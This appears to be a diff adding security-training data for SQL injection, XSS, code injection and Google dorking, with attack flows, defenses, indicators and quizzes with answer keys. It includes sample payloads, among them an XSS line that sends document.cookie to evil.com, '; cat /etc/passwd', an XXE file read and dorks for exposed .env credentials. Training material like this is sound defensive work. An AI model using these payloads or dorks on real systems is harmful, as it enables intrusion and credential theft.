+                { name: 'Heartland Payment Systems (2008)', detail: 'SQL injection led to the compromise of 130 million credit card numbers — the largest credit card breach at the time. Attacker Albert Gonzalez was sentenced to 20 years in prison.' },
+                { name: 'Sony PlayStation Network (2011)', detail: 'SQL injection attack exposed personal data of 77 million user accounts, including names, addresses, and possibly credit card data. Sony took the PSN offline for 23 days.' },
+                { name: 'TalkTalk (2015)', detail: 'A 15-year-old exploited a SQL injection vulnerability to steal personal data of 157,000 customers. TalkTalk was fined \u00A3400,000 and lost 101,000 customers.' }
+            ],
+            stats: [
+                { label: 'Web apps vulnerable', value: '~32%', note: 'of web applications have SQLi flaws (HackerOne)' },
+                { label: 'Avg. breach cost', value: '$4.45M', note: 'injection-related breaches (IBM 2024)' },
+                { label: 'OWASP ranking', value: 'Top 3', note: 'Consistently in the top 3 most critical web vulnerabilities' }
+            ]
+        },
+        attackFlow: {
+            title: 'SQL Injection Attack Flow',
+            steps: [
+                { phase: 'Input Discovery', description: 'Attacker identifies input fields that interact with the database: login forms, search boxes, URL parameters, cookies, HTTP headers. Single quotes (\') and SQL keywords are injected to probe for errors.', icon: '\u{1F50D}' },
+                { phase: 'Error Analysis', description: 'Database error messages reveal the SQL dialect (MySQL, MSSQL, PostgreSQL, Oracle), query structure, table names, and column types. Even generic errors confirm SQL injection vulnerability.', icon: '\u{1F4CB}' },
+                { phase: 'Query Manipulation', description: 'Attacker crafts payloads: tautology (OR 1=1) for authentication bypass, UNION SELECT for data extraction, ORDER BY for column enumeration, or stacked queries (;DROP TABLE) for modification.', icon: '\u{270F}' },
+                { phase: 'Data Extraction', description: 'Using UNION SELECT, the attacker reads database schema (information_schema), then extracts tables, columns, and data including credentials, PII, financial records, and admin accounts.', icon: '\u{1F4E4}' },
+                { phase: 'Privilege Escalation', description: 'If the database user has elevated privileges, the attacker reads/writes files (LOAD_FILE, INTO OUTFILE), executes OS commands (xp_cmdshell in MSSQL), or accesses other databases on the server.', icon: '\u{2B06}' },
+                { phase: 'Persistence & Covering Tracks', description: 'Attacker creates backdoor accounts, installs web shells via INTO OUTFILE, modifies log tables, or establishes ongoing data exfiltration through blind/out-of-band channels.', icon: '\u{1F6AA}' }
+            ]
+        },
+        defense: {
+            detection: [
+                'Web Application Firewall (WAF) rules detecting SQL keywords in input parameters',
+                'Database activity monitoring (DAM) for unusual query patterns and data access volumes',
+                'Input validation alerts: single quotes, UNION, SELECT, DROP, OR 1=1 patterns',
+                'Application logging of all database queries with parameterized vs. concatenated distinction',
+                'Runtime Application Self-Protection (RASP) detecting query manipulation at execution'
+            ],
+            prevention: [
+                'Parameterized queries (prepared statements) for ALL database interactions — no exceptions',
+                'Stored procedures with parameterized inputs as an additional layer',
+                'Input validation: whitelist allowed characters, reject or escape special characters',
+                'Principle of least privilege: database accounts used by applications should have minimal permissions',
+                'Disable detailed database error messages in production (custom error pages only)'
+            ],
+            response: [
+                'Identify the injection point and immediately deploy a WAF rule to block the attack pattern',
+                'Audit database logs to determine what data was accessed or modified',
+                'Reset all database credentials and application service account passwords',
+                'Fix the vulnerable code by replacing string concatenation with parameterized queries',
+                'Conduct a full application security assessment (code review + DAST scan) to find additional SQLi vulnerabilities'
+            ]
+        },
+        indicators: {
+            network: [
+                'HTTP requests containing SQL keywords (UNION, SELECT, DROP, INSERT, OR 1=1) in parameters',
+                'URL-encoded SQL injection attempts in query strings (%27 for single quote, %3B for semicolon)',
+                'High volume of requests to the same endpoint with varying payloads (automated scanning)',
+                'Unusually large HTTP responses from pages that normally return small results (data dumping)',
+                'Time-based blind SQLi: requests causing consistent server response delays (WAITFOR DELAY, SLEEP)'
+            ],
+            host: [
+                'Database error logs showing syntax errors from injected SQL fragments',
+                'Unusual queries accessing information_schema or system tables',
+                'Database account executing queries outside its normal pattern (file reads, OS commands)',
+                'Web server logs with SQL keywords in request parameters',
+                'New database users or modified permissions not aligned with change management'
+            ],
+            behavioral: [
+                'Systematic probing of input fields with escalating SQL injection complexity',
+                'Large data extractions from database following a series of reconnaissance queries',
+                'Application database account suddenly accessing tables it has never queried before',
+                'Web shells appearing on the server after database file-write operations',
+                'Automated scanner signatures: sqlmap, Havij, or jSQL user-agent strings or patterns'
+            ],
+            tools: ['sqlmap (automated SQLi)', 'Burp Suite', 'OWASP ZAP', 'Havij', 'jSQL Injection', 'NoSQLMap', 'DB Browser for SQLite', 'Database Activity Monitoring (DAM) tools']
+        },
+        interactive: {
+            scenario: 'A junior developer writes this login query: SELECT * FROM users WHERE username = [username] AND password = [password] — using string concatenation to insert user input directly into the SQL. During a code review, you notice this. The developer says: "I added input validation that blocks the word DROP so it\'s safe." Is the developer correct? What do you do?',
+            options: [
+                'The developer is correct — blocking DROP prevents SQL injection',
+                'Add more keywords to the blocklist (UNION, SELECT, INSERT) for better protection',
+                'The developer is wrong — keyword blocklists are easily bypassed. Rewrite the query using parameterized queries (prepared statements) and explain that input filtering is a supplement to, not a replacement for, parameterization',
+                'Add a WAF in front of the application instead of fixing the code'
+            ],
+            correct: 2,
+            explanation: 'Keyword blocklists are trivially bypassed through: case alternation (DrOp, sElEcT), encoding (%55NION), comments (UN/**/ION), or null bytes. The ONLY reliable defense is parameterized queries, which separate SQL code from data at the database driver level — the database engine never interprets user input as SQL. Example fix: `SELECT * FROM users WHERE username = ? AND password = ?` with values passed as parameters. WAFs are useful as defense-in-depth but cannot replace secure coding.'
+        },
+        quiz: [
+            { question: 'What is the fundamental cause of SQL injection vulnerabilities?', options: ['Weak database passwords', 'Building SQL queries by concatenating user input instead of using parameterized queries', 'Using open-source databases', 'Not having a firewall'], correct: 1, explanation: 'SQL injection occurs when user input is concatenated directly into SQL query strings, allowing the database to interpret attacker input as SQL code instead of data.' },
+            { question: 'An attacker enters `admin\' OR 1=1 --` as a username. What type of SQLi attack is this?', options: ['Blind SQLi', 'A tautology attack — OR 1=1 makes the WHERE clause always true, bypassing authentication', 'UNION-based extraction', 'Time-based injection'], correct: 1, explanation: 'This is a classic tautology attack. The input closes the username string, adds OR 1=1 (always true), and comments out the rest of the query (--), causing the database to return all users and bypass the login check.' },
+            { question: 'What is blind SQL injection?', options: ['SQL injection that does not require seeing the database', 'SQL injection where the attacker cannot see query results directly but infers data through true/false responses or time delays', 'SQL injection performed with eyes closed', 'SQL injection that only works on encrypted databases'], correct: 1, explanation: 'In blind SQLi, error messages and data are not returned to the attacker. Instead, they ask true/false questions (boolean-based) or measure response times (time-based) to extract data one bit at a time.' },
+            { question: 'Why are parameterized queries the definitive defense against SQL injection?', options: ['They encrypt the SQL query', 'They separate SQL code from data at the driver level — the database engine never interprets user input as SQL commands', 'They are faster than regular queries', 'They automatically validate all input'], correct: 1, explanation: 'Parameterized queries send the SQL template and user data separately to the database engine. The engine compiles the SQL first, then binds the data as literal values — making it structurally impossible for user input to alter the query logic.' },
+            { question: 'An attacker uses `ORDER BY 5--` and gets an error, but `ORDER BY 4--` works. What did they learn?', options: ['The database has 5 tables', 'The current query returns 4 columns — this information is needed to craft a UNION SELECT with the correct number of columns', 'The database has 4 users', 'The server runs on port 4'], correct: 1, explanation: 'ORDER BY N tests if column N exists in the result set. When ORDER BY 5 errors but ORDER BY 4 succeeds, the attacker knows the query returns exactly 4 columns — essential for constructing a valid UNION SELECT statement.' }
+        ]
+    },
+
+    // =================================================================
+    // 21. CROSS-SITE SCRIPTING (XSS)
+    // =================================================================
+    XSS: {
+        code: 'XSS',
+        title: 'Cross-Site Scripting (XSS)',
+        icon: '\u{1F4DC}',
+        severity: 'high',
+        color: '#a855f7',
+        description: 'A web vulnerability where attackers inject malicious scripts into trusted websites, which execute in victims\' browsers to steal cookies, session tokens, or redirect users to malicious sites.',
+        overview: {
+            what: 'Cross-Site Scripting (XSS) occurs when a web application includes untrusted data in its output without proper validation or encoding, allowing attackers to inject client-side scripts (typically JavaScript) that execute in other users\' browsers. There are three main types: Reflected XSS (payload in the request, reflected in the response), Stored XSS (payload persisted in the database, served to all visitors), and DOM-based XSS (payload manipulates the client-side DOM without server involvement). XSS enables cookie theft, session hijacking, keylogging, defacement, and phishing.',
+            keyPoints: [
+                'Reflected XSS: payload is in the URL/request and reflected back in the response (most common, requires user to click a link)',
+                'Stored XSS: payload is saved in the database and served to every visitor (most dangerous — no click needed)',
+                'DOM-based XSS: client-side JavaScript processes attacker-controlled data unsafely (e.g., document.location, innerHTML)',
+                'Content Security Policy (CSP) headers are the primary browser-level defense',
+                'Output encoding (HTML entity encoding) is the primary code-level defense'
+            ],
+            examples: [
+                { name: 'Samy Worm — MySpace (2005)', detail: 'The fastest spreading virus at the time — a stored XSS worm on MySpace that added "Samy is my hero" to profiles and sent friend requests. Infected 1 million users in 20 hours.' },
+                { name: 'British Airways (2018)', detail: 'Magecart group injected XSS into BA\'s payment page, skimming credit card details from 380,000 customers over 15 days. BA was fined \u00A3183 million under GDPR.' },
+                { name: 'eBay XSS (2015-2016)', detail: 'Stored XSS in eBay listing descriptions allowed attackers to inject scripts into product pages, redirecting buyers to phishing sites and stealing credentials.' }
+            ],
+            stats: [
+                { label: 'Web apps affected', value: '~53%', note: 'of web applications have XSS vulnerabilities (HackerOne)' },
+                { label: 'Bug bounty reports', value: '#1', note: 'Most reported vulnerability class in bug bounty programs' },
+                { label: 'OWASP ranking', value: 'Top 3', note: 'Consistently in the OWASP Top 10' }
+            ]
+        },
+        attackFlow: {
+            title: 'XSS Attack Flow',
+            steps: [
+                { phase: 'Injection Point Discovery', description: 'Attacker identifies where user input is reflected or stored in page output: search results, comments, profile fields, URL parameters, error messages. Test payloads like <script>alert(1)</script> probe for unescaped output.', icon: '\u{1F50D}' },
+                { phase: 'Payload Crafting', description: 'Attacker develops a payload that bypasses filters: event handlers (onerror, onload), alternative tags (img, svg, iframe), encoding tricks (HTML entities, Unicode, URL encoding), or DOM manipulation.', icon: '\u{270F}' },
+                { phase: 'Delivery', description: 'For reflected XSS: crafts a URL with the payload and tricks the victim into clicking it (email, social media). For stored XSS: submits the payload through a form (comment, profile) where it is saved and served to all visitors.', icon: '\u{1F4E8}' },
+                { phase: 'Script Execution', description: 'When a victim\'s browser renders the page containing the injected payload, the script executes in the context of the trusted website with full access to cookies, session storage, and DOM.', icon: '\u{26A1}' },
+                { phase: 'Data Exfiltration', description: 'The malicious script steals session cookies (document.cookie), captures keystrokes, reads sensitive page content, or makes authenticated API requests on behalf of the victim — sending data to the attacker\'s server.', icon: '\u{1F4E4}' },
+                { phase: 'Exploitation', description: 'Attacker uses stolen session tokens to hijack accounts, stolen credentials for further access, or leverages the trusted site\'s context to deliver secondary payloads (drive-by downloads, phishing forms).', icon: '\u{1F3AF}' }
+            ]
+        },
+        defense: {
+            detection: [
+                'Web Application Firewall (WAF) rules detecting script tags, event handlers, and encoding bypass attempts',
+                'Content Security Policy (CSP) violation reports (report-uri / report-to directives)',
+                'Input validation alerts for HTML tags, JavaScript event handlers, and encoded scripts',
+                'Browser developer tools detecting unexpected inline scripts on your pages',
+                'Automated DAST scanning with tools like Burp Suite, OWASP ZAP, or Acunetix'
+            ],
+            prevention: [
+                'Output encoding: HTML entity encode all user-supplied data before rendering in HTML context',
+                'Content Security Policy (CSP): restrict script sources with strict-dynamic or nonce-based policies',
+                'Use modern frameworks (React, Angular, Vue) that auto-escape output by default',
+                'HTTPOnly and Secure flags on session cookies to prevent JavaScript access',
+                'Input validation: whitelist allowed characters, reject or sanitize HTML tags'
+            ],
+            response: [
+                'Identify and remove/sanitize the stored XSS payload from the database immediately',
+                'Deploy emergency WAF rules to block the specific payload pattern',
+                'Invalidate all active sessions for affected users (stolen cookies may be in use)',
+                'Fix the vulnerable code with proper output encoding and CSP headers',
+                'Scan the entire application for similar XSS vulnerabilities with automated tools'
+            ]
+        },
+        indicators: {
+            network: [
+                'HTTP requests containing script tags, event handlers (onerror, onload, onmouseover), or javascript: URIs',
+                'Outbound requests from users\' browsers to unknown external domains (exfiltrating stolen data)',
+                'CSP violation reports indicating blocked inline script execution attempts',
+                'Requests with encoded payloads: HTML entities (&#60;script&#62;), URL encoding (%3Cscript%3E), Unicode',
+                'Unusual POST data in form submissions containing HTML or JavaScript'
+            ],
+            host: [
+                'Database records containing script tags, event handlers, or encoded JavaScript payloads',
+                'Web server access logs showing XSS probe patterns (<script>, alert(, onerror=)',
+                'Unexpected changes to page content or DOM structure when inspecting served HTML',
+                'JavaScript files modified to include malicious code (supply-chain XSS)',
+                'Browser console errors from CSP blocking injected scripts'
+            ],
+            behavioral: [
+                'Users reporting unexpected redirects, pop-ups, or login prompts on your site',
+                'Session hijacking: accounts accessed from unusual IPs shortly after visiting specific pages',
+                'Defaced pages or modified content visible to some users but not others (stored XSS)',
+                'Automated scanning patterns: rapid requests with incrementally complex XSS payloads',
+                'Magecart-style data skimming: payment form data sent to third-party domains'
+            ],
+            tools: ['Burp Suite', 'OWASP ZAP', 'XSStrike', 'DOMPurify (sanitization library)', 'CSP Evaluator (Google)', 'BeEF (Browser Exploitation Framework)', 'Acunetix', 'Retire.js (vulnerable JS libraries)']
+        },
+        interactive: {
+            scenario: 'A user reports that visiting a product review page on your e-commerce site causes their browser to briefly redirect to an external site before returning. Your investigation reveals that a product review comment contains: `<img src=x onerror="document.location=\'https://evil.com/steal?c=\'+document.cookie">`. The comment was submitted 3 days ago and the page averages 2,000 daily visitors. What type of XSS is this, what is the impact, and what do you do?',
+            options: [
+                'This is reflected XSS — delete the comment and add a WAF rule',
+                'This is stored XSS — the payload is in the database and has been executing for every visitor for 3 days. Immediately remove the payload from the database, invalidate all user sessions (up to 6,000 users may have had cookies stolen), deploy CSP headers, fix the review submission to HTML-encode output, and scan for similar payloads in all user-generated content',
+                'This is DOM-based XSS — update the client-side JavaScript to fix the rendering issue',
+                'Block the external domain at the firewall and the issue is resolved'
+            ],
+            correct: 1,
+            explanation: 'This is stored XSS: the payload is persisted in the database and executes for every visitor. The img tag with onerror bypasses basic <script> tag filters. The impact: up to 6,000 users (2,000/day x 3 days) may have had their session cookies stolen. Remediation: (1) Remove the payload from the database NOW, (2) Invalidate ALL active sessions since cookies may be compromised, (3) Add Content Security Policy headers to prevent future inline script execution, (4) Fix the review rendering to HTML-encode all user content, (5) Scan all user-generated content for similar payloads, (6) Consider notifying affected users.'
+        },
+        quiz: [
+            { question: 'What is the difference between reflected and stored XSS?', options: ['Reflected XSS uses JavaScript, stored XSS uses HTML', 'Reflected XSS payload is in the request and not persisted; stored XSS payload is saved in the database and served to all visitors', 'Reflected XSS is more dangerous than stored XSS', 'Reflected XSS only works in Chrome'], correct: 1, explanation: 'Reflected XSS requires tricking each victim into clicking a crafted URL. Stored XSS is saved on the server and automatically executes for every visitor — making it far more dangerous and scalable.' },
+            { question: 'Why is `<img src=x onerror=alert(1)>` used as an XSS payload?', options: ['It displays an image with an alert', 'The invalid src triggers the onerror event handler, executing JavaScript without using a <script> tag — bypassing basic filters', 'It is the only way to execute JavaScript', 'It only works on old browsers'], correct: 1, explanation: 'This technique exploits HTML event handlers instead of <script> tags. When the browser fails to load the invalid image source (x), it fires the onerror event, executing the attacker\'s JavaScript. This bypasses filters that only block <script> tags.' },
+            { question: 'What does Content Security Policy (CSP) protect against?', options: ['SQL injection', 'CSP restricts which scripts can execute on a page — blocking inline scripts and unauthorized script sources, preventing XSS exploitation', 'DDoS attacks', 'Brute force login attempts'], correct: 1, explanation: 'CSP is a browser security mechanism that controls which resources (scripts, styles, images) can load on a page. A strict CSP (e.g., script-src \'nonce-abc123\') blocks injected inline scripts even if XSS exists in the code.' },
+            { question: 'The Samy worm on MySpace exploited which type of XSS?', options: ['Reflected XSS', 'Stored XSS — the worm payload was saved in profile pages and executed for every visitor, spreading to 1 million users in 20 hours', 'DOM-based XSS', 'None — it was not XSS'], correct: 1, explanation: 'Samy was a stored XSS worm. The payload was injected into MySpace profiles, and when other users viewed an infected profile, the worm copied itself to their profile, creating exponential spread.' },
+            { question: 'What is the HTTPOnly cookie flag and how does it relate to XSS?', options: ['It makes cookies only work over HTTP, not HTTPS', 'It prevents JavaScript (including XSS payloads) from reading the cookie via document.cookie — protecting session tokens from theft', 'It encrypts cookie values', 'It deletes cookies after each request'], correct: 1, explanation: 'The HTTPOnly flag instructs the browser to block JavaScript access to the cookie. Even if XSS executes, document.cookie will not return HTTPOnly cookies — protecting session tokens from the most common XSS exploitation technique.' }
+        ]
+    },
+
+    // =================================================================
+    // 22. CODE INJECTION
+    // =================================================================
+    CODE_INJECTION: {
+        code: 'CODE_INJECTION',
+        title: 'Code Injection',
+        icon: '\u{1F4BB}',
+        severity: 'critical',
+        color: '#a855f7',
+        description: 'Attacks where malicious code is injected into an application for execution — including OS command injection, LDAP injection, XML injection, and template injection.',
+        overview: {
+            what: 'Code injection is a broad class of attacks where an attacker inserts malicious code into an application that is then executed by the interpreter. Unlike SQL injection (which targets databases), code injection encompasses OS command injection (executing system commands via shell), LDAP injection (manipulating directory queries), XML injection/XXE (exploiting XML parsers), Server-Side Template Injection (SSTI), and eval()-based injection in scripting languages. The common thread: user input is treated as executable code rather than data.',
+            keyPoints: [
+                'OS Command Injection: user input passed to system(), exec(), or shell commands (e.g., ; cat /etc/passwd)',
+                'LDAP Injection: manipulating LDAP queries to bypass authentication or extract directory data',
+                'XML External Entity (XXE): malicious XML with external entity references reads server files or triggers SSRF',
+                'Server-Side Template Injection (SSTI): injecting template syntax ({{7*7}}) that executes on the server',
+                'All variants share one root cause: mixing user data with executable code/queries'
+            ],
+            examples: [
+                { name: 'Shellshock / Bash Bug (2014)', detail: 'CVE-2014-6271 — a vulnerability in Bash that allowed command injection via environment variables. Affected millions of web servers using CGI, IoT devices, and macOS systems. Exploited within hours of disclosure.' },
+                { name: 'Equifax Breach via Apache Struts (2017)', detail: 'CVE-2017-5638 — an OGNL injection (expression language injection) in Apache Struts allowed remote code execution. Attackers stole personal data of 147 million Americans.' },
+                { name: 'Capital One Breach via SSRF (2019)', detail: 'A misconfigured WAF combined with a Server-Side Request Forgery (SSRF) vulnerability allowed an attacker to execute commands against AWS metadata services, exposing 100+ million customer records.' }
+            ],
+            stats: [
+                { label: 'OWASP ranking', value: '#3 Injection', note: 'Injection flaws are #3 in the 2021 OWASP Top 10' },
+                { label: 'Command injection', value: '~12%', note: 'of critical vulnerabilities in web apps (HackerOne)' },
+                { label: 'Equifax settlement', value: '$700M+', note: 'Resulting from a single injection vulnerability' }
+            ]
+        },
+        attackFlow: {
+            title: 'Code Injection Attack Flow',
+            steps: [
+                { phase: 'Input Identification', description: 'Attacker identifies inputs that are passed to interpreters: file paths, hostnames (ping/nslookup), search fields (LDAP), XML uploads, template fields, or any input processed by eval() or system calls.', icon: '\u{1F50D}' },
+                { phase: 'Interpreter Fingerprinting', description: 'Tests reveal which interpreter processes the input: OS shell (command separators ;, |, &&), LDAP (parentheses, wildcards), XML parser (entity references), template engine ({{, ${, <%}).', icon: '\u{1F9EA}' },
+                { phase: 'Payload Injection', description: 'Attacker crafts a payload for the identified interpreter: `; cat /etc/passwd` (OS), `)(|(password=*))` (LDAP), `<!ENTITY xxe SYSTEM "file:///etc/passwd">` (XXE), `{{config.items()}}` (SSTI).', icon: '\u{1F489}' },
+                { phase: 'Code Execution', description: 'The application passes the payload to the interpreter, which executes it with the application\'s permissions. OS commands run as the web server user; LDAP queries run with the bind account\'s access.', icon: '\u{26A1}' },
+                { phase: 'Data Extraction / Escalation', description: 'Attacker reads sensitive files (/etc/passwd, /etc/shadow, application config), enumerates the system, downloads credentials, or establishes a reverse shell for persistent access.', icon: '\u{1F4E4}' },
+                { phase: 'Persistence', description: 'Installs backdoors (cron jobs, SSH keys, web shells), creates new user accounts, or modifies application code to maintain access beyond the initial injection point.', icon: '\u{1F6AA}' }
+            ]
+        },
+        defense: {
+            detection: [
+                'Web Application Firewall (WAF) signatures for command separators (;, |, &&, ||), LDAP special characters, and XML entity declarations',
+                'System call monitoring: detect web application processes spawning unexpected child processes (bash, cmd, powershell)',
+                'File integrity monitoring on critical system files and application directories',
+                'LDAP query logging for malformed or unusually broad queries',
+                'XML parser logging for external entity resolution attempts'
+            ],
+            prevention: [
+                'Never pass user input directly to OS commands — use language-native APIs (file operations, DNS lookups) instead of shell commands',
+                'Input validation: strict whitelist of allowed characters, reject metacharacters (; | & ` $ ( ) < >)',
+                'Parameterized LDAP queries and disable anonymous binds',
+                'Disable external entities in XML parsers (XXE prevention): set disallow-doctype-decl=true',
+                'Principle of least privilege: run application processes with minimal OS permissions'
+            ],
+            response: [
+                'Isolate the affected system immediately — assume the attacker has shell access',
+                'Audit system for backdoors: check cron jobs, SSH authorized_keys, web shells, new user accounts',
+                'Review all application inputs for injection vulnerabilities (code review + DAST scanning)',
+                'Rotate all credentials accessible from the compromised server (database, API keys, service accounts)',
+                'Reimage the server from known-good backups after forensic analysis'
+            ]
+        },
+        indicators: {
+            network: [
+                'HTTP requests containing command separators or shell metacharacters in parameters',
+                'Outbound connections from the web server to unusual external hosts (reverse shell)',
+                'DNS queries from the web server for attacker-controlled domains (out-of-band exfiltration)',
+                'XML payloads containing DOCTYPE declarations with ENTITY definitions in HTTP requests',
+                'LDAP traffic with malformed queries containing injection metacharacters'
+            ],
+            host: [
+                'Web server process spawning unexpected child processes (bash, sh, cmd, powershell)',
+                'Unauthorized file reads: /etc/passwd, /etc/shadow, application configuration files',
+                'New cron jobs, scheduled tasks, or SSH keys not created by administrators',
+                'Web shells in web-accessible directories (.php, .jsp, .asp files)',
+                'Application logs showing command injection attempts or template syntax errors'
+            ],
+            behavioral: [
+                'Web application suddenly making DNS queries or HTTP requests to external domains',
+                'System resource usage spikes from injected commands (crypto mining, data exfiltration)',
+                'File modifications in application directories without corresponding deployments',
+                'New user accounts or SSH keys appearing on application servers',
+                'LDAP directory modifications (new accounts, changed group memberships) without admin action'
+            ],
+            tools: ['Commix (OS command injection)', 'XXEinjector', 'Tplmap (SSTI)', 'Burp Suite', 'OWASP ZAP', 'ldapsearch (LDAP testing)', 'AppArmor / SELinux (process confinement)', 'Sysdig / Falco (runtime detection)']
+        },
+        interactive: {
+            scenario: 'Your web application has a "network diagnostic" feature that lets users enter a hostname and pings it. The backend code is: `os.system("ping -c 4 " + user_input)`. A security researcher reports that entering `google.com; cat /etc/passwd` returns the system password file. Your developer proposes fixing it by blocking semicolons in the input. Is this sufficient?',
+            options: [
+                'Yes — blocking semicolons prevents command chaining and fixes the vulnerability',
+                'No — add more characters to the blocklist (|, &, backticks) for complete protection',
+                'No — character blocklists are always incomplete. Replace the system() call with a language-native ping library or subprocess with argument arrays (no shell interpretation). If a shell command is absolutely necessary, use strict whitelist validation (only allow a-z, 0-9, dots, and hyphens for hostnames).',
+                'No — just add a WAF in front of the application and keep the current code'
+            ],
+            correct: 2,
+            explanation: 'Character blocklists for command injection are notoriously incomplete. Beyond semicolons, attackers can use: pipes (|), background execution (&), backticks (`command`), $() substitution, newlines (%0a), and more. The correct fix: (1) Eliminate the shell entirely — use subprocess with an argument array: subprocess.run(["ping", "-c", "4", user_input]) which passes user_input as a single argument, not shell code. (2) If shell is unavoidable, strictly whitelist the input (only allow hostname-valid characters: a-z, 0-9, dots, hyphens). (3) WAFs help as defense-in-depth but must not replace secure coding.'
+        },
+        quiz: [
+            { question: 'What is the fundamental difference between SQL injection and OS command injection?', options: ['They exploit the same interpreter', 'SQL injection targets database engines; OS command injection targets the operating system shell — but both occur because user input is mixed with executable code', 'Command injection is more common', 'SQL injection is always more dangerous'], correct: 1, explanation: 'Both are injection attacks with the same root cause (untrusted input treated as code), but they target different interpreters. SQLi manipulates database queries; command injection executes OS-level commands.' },
+            { question: 'What is XML External Entity (XXE) injection?', options: ['Injecting XML into databases', 'Exploiting XML parsers that process external entity references to read server files, trigger SSRF, or cause denial of service', 'A type of XSS attack using XML', 'A database injection using XML format'], correct: 1, explanation: 'XXE exploits XML parsers that resolve external entity declarations. A malicious entity like <!ENTITY xxe SYSTEM "file:///etc/passwd"> causes the parser to read and return the server file contents.' },
+            { question: 'Shellshock (CVE-2014-6271) allowed command injection through which mechanism?', options: ['URL parameters', 'Environment variables processed by Bash — specifically, function definitions followed by arbitrary commands in env vars', 'SQL queries', 'Cookie values'], correct: 1, explanation: 'Shellshock exploited Bash\'s handling of function definitions in environment variables. An env var like `() { :; }; malicious_command` would execute the command after the function definition when Bash processed it.' },
+            { question: 'Why is `subprocess.run(["ping", "-c", "4", hostname])` safer than `os.system("ping -c 4 " + hostname)`?', options: ['subprocess is faster', 'The array form passes each argument separately to the kernel — the hostname is never interpreted by a shell, so metacharacters have no special meaning', 'subprocess has built-in encryption', 'os.system is deprecated'], correct: 1, explanation: 'With an argument array, each element is passed directly to the execve() system call as a separate argument. There is no shell interpretation, so ; | & ` and other metacharacters are treated as literal characters in the hostname string.' },
+            { question: 'What is Server-Side Template Injection (SSTI)?', options: ['Injecting templates into a browser', 'Injecting template engine syntax (e.g., {{7*7}}) into server-side templates, which the engine evaluates and executes — potentially leading to remote code execution', 'A type of CSS injection', 'Injecting HTML templates into emails'], correct: 1, explanation: 'SSTI occurs when user input is embedded directly into server-side templates (Jinja2, Twig, Freemarker). The template engine evaluates expressions like {{7*7}} → 49, and attackers can escalate to reading files, executing commands, and full RCE.' }
+        ]
+    },
+
+    // =================================================================
+    // 23. GOOGLE HACKING / DORKING
+    // =================================================================
+    GOOGLE_HACKING: {
+        code: 'GOOGLE_HACKING',
+        title: 'Google Hacking / Dorking',
+        icon: '\u{1F50E}',
+        severity: 'medium',
+        color: '#a855f7',
+        description: 'Using advanced search engine operators to discover exposed files, vulnerable servers, login portals, cameras, databases, and sensitive information indexed by search engines.',
+        overview: {
+            what: 'Google Hacking (also called Google Dorking) is the technique of using advanced search engine operators to find information that was unintentionally exposed on the internet. By combining operators like site:, filetype:, intitle:, inurl:, and intext:, attackers (and security professionals) can discover login portals, configuration files, database dumps, exposed cameras, directory listings, and vulnerable servers — all indexed by Google\'s crawler. The Google Hacking Database (GHDB) catalogs thousands of these "dorks" for security research and penetration testing.',
+            keyPoints: [
+                'Key operators: site: (limit to domain), filetype: (specific file types), intitle: (page title), inurl: (URL path), intext: (body content)',
+                'GHDB (Google Hacking Database) maintained by Exploit-DB catalogs 6,000+ proven search queries',
+                'Finds: exposed admin panels, directory listings, config files (.env, wp-config.php), database backups, webcams',
+                'Not illegal to search — but accessing discovered systems without authorization is illegal',
+                'Part of the OSINT (Open Source Intelligence) reconnaissance phase in penetration testing'
+            ],
+            examples: [
+                { name: 'Exposed Environment Files', detail: 'The dork `filetype:env "DB_PASSWORD"` consistently reveals .env files containing database credentials, API keys, and secret keys on misconfigured web servers — thousands are indexed at any given time.' },
+                { name: 'Unsecured IP Cameras', detail: 'Dorks like `intitle:"Live View / – AXIS"` and `inurl:"/view.shtml"` reveal thousands of publicly accessible security cameras, baby monitors, and industrial cameras with default or no authentication.' },
+                { name: 'Jenkins/GitLab Exposed Dashboards', detail: 'Dorks like `intitle:"Dashboard [Jenkins]"` or `inurl:"/admin/login" site:.gov` reveal exposed CI/CD pipelines and admin panels on government and corporate servers.' }
+            ],
+            stats: [
+                { label: 'GHDB entries', value: '6,800+', note: 'Documented dorks in the Google Hacking Database (Exploit-DB)' },
+                { label: 'Exposed .env files', value: '1,000s', note: 'New database credentials indexed weekly' },
+                { label: 'Recon phase usage', value: '~100%', note: 'of pen testers use Google dorking in reconnaissance' }
+            ]
+        },
+        attackFlow: {
+            title: 'Google Hacking Reconnaissance Flow',
+            steps: [
+                { phase: 'Target Scoping', description: 'Attacker defines the target: a specific organization (site:target.com), industry sector, or technology stack. Initial broad searches map the target\'s web presence and subdomains.', icon: '\u{1F3AF}' },
+                { phase: 'Operator Crafting', description: 'Combines advanced operators to narrow results: `site:target.com filetype:sql "password"` finds SQL dumps, `site:target.com inurl:admin` finds admin panels, `site:target.com ext:log` finds log files.', icon: '\u{270F}' },
+                { phase: 'GHDB Mining', description: 'Searches the Google Hacking Database (GHDB) for proven dorks relevant to the target\'s technology stack: WordPress, Apache, Nginx, Jenkins, Docker, AWS S3, etc.', icon: '\u{1F4DA}' },
+                { phase: 'Results Analysis', description: 'Reviews discovered pages: directory listings for file enumeration, exposed configs for credentials, admin panels for brute-force targets, error pages for technology fingerprinting.', icon: '\u{1F4CB}' },
+                { phase: 'Information Harvesting', description: 'Collects credentials from .env files, database connection strings from configs, employee names from documents, internal IP ranges from error messages, and technology stack details from headers.', icon: '\u{1F4E5}' },
+                { phase: 'Attack Preparation', description: 'Harvested intelligence feeds into the next attack phases: credential stuffing with found passwords, targeting discovered admin panels, exploiting identified software versions, and social engineering with employee data.', icon: '\u{1F5FA}' }
+            ]
+        },
+        defense: {
+            detection: [
+                'Google Search Console alerts for unexpected pages being indexed',
+                'Monitor GHDB for new dorks targeting your technology stack',
+                'Regular automated dorking against your own domains (self-assessment)',
+                'Web server access logs showing Googlebot indexing sensitive directories',
+                'Alerts on robots.txt changes or .htaccess modifications'
+            ],
+            prevention: [
+                'robots.txt: Disallow sensitive directories from crawler indexing (defense-in-depth, not security boundary)',
+                'X-Robots-Tag: noindex headers on sensitive pages and admin portals',
+                'Authentication required for ALL admin panels, dashboards, and management interfaces',
+                'Remove sensitive files from web-accessible directories (.env, .git, backups, configs)',
+                'Regularly audit web root for unintended files: `site:yourdomain.com filetype:env OR filetype:sql OR filetype:log`'
+            ],
+            response: [
+                'Immediately remove discovered exposed files and credentials from web-accessible directories',
+                'Rotate ALL credentials found in exposed configuration files (database, API keys, secrets)',
+                'Request Google cache removal via Search Console for sensitive indexed pages',
+                'Add authentication to any discovered open admin panels or dashboards',
+                'Conduct a comprehensive review: `site:yourdomain.com` to inventory all indexed pages'
+            ]
+        },
+        indicators: {
+            network: [
+                'Googlebot or other search engine crawlers indexing sensitive directories or files',
